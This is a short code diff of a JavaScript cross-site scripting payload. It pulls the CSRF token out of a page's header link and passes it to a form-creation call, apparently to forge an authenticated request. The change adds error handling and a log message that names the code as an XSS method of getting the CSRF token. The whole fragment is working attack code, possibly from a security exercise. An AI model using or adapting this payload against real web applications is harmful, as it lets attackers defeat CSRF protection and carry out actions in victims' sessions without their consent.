@@ -12,9 +12,14 @@
                 
                 var csrf = 'a1b2';
                 setTimeout(function(){
-                    var header = document.getElementById("header").getElementsByTagName("a")[0];
-                    var href = header.getAttribute("href");
-                    csrf = href.split("=")[1];      
+                    try {
+                        var header = document.getElementById("header").getElementsByTagName("a")[0];
+                        var href = header.getAttribute("href");
+                        csrf = href.split("=")[1];
+                    }
+                    catch(e) {
+                        console.log("couldn't get the CSRF token using XSS!");
+                    }
                 }, 3);
 
                 createForm('fcab4e7dfbe01ce4e3904b97febe6a6a184302c3', csrf);
